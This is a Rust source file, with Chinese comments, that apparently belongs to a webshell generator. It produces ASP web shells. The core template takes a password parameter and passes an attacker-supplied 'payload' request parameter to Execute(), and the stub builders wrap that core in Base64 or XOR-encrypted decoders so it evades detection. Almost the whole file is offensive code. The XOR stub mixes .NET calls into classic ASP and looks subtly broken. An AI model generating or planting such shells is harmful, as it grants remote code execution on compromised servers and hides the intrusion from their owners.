/// 获取 ASP 文件型 Shell 基础模板
/// 占位符 `%s` 是解密存根代码
pub fn get_template() -> String {
    "<%\n%s\n%>".to_string()
}

/// 获取 ASP 核心执行代码（将被加密）
pub fn get_core() -> String {
    r#"
Dim pass, payload
pass = Request("pass")
If Not IsEmpty(pass) Then
    payload = Request("payload")
    If Not IsEmpty(payload) Then
        Execute(payload)
    End If
End If
"#.to_string()
}

use crate::core::crypto::EncryptionType;

/// 构建 ASP 解密存根
pub fn build_decrypt_stub(
    encryption: &EncryptionType,
    ciphertext: &str,
    _nonce: &Option<String>,
    _tag: &Option<String>,
    password: &str,
) -> String {
    match encryption {
        EncryptionType::None => {
            format!(
                "Dim ciphertext: ciphertext = \"{}\"\nDim payload: payload = Base64Decode(ciphertext)\nExecute(payload)\n",
                ciphertext
            )
        }
        EncryptionType::XOR => {
            format!(
                "Dim ciphertext: ciphertext = \"{}\"\nDim encoded: encoded = Base64Decode(ciphertext)\nDim password: password = \"{}\"\nDim sha: Set sha = CreateObject(\"System.Security.Cryptography.SHA256Managed\")\nDim keyBytes: keyBytes = sha.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password))\nDim result: result = CreateArray(0)\nDim i: For i = 1 To Len(encoded)\n    result(i-1) = Asc(Mid(encoded, i, 1)) Xor keyBytes((i-1) Mod UBound(keyBytes)+1)\nNext\nDim payload: payload = System.Text.Encoding.UTF8.GetString(result)\nExecute(payload)\n",
                ciphertext, password
            )
        }
        EncryptionType::AES256GCM => "' AES-256-GCM not implemented for ASP yet".to_string(),
        EncryptionType::ChaCha20Poly1305 => "' ChaCha20-Poly1305 not implemented for ASP yet".to_string(),
    }
}
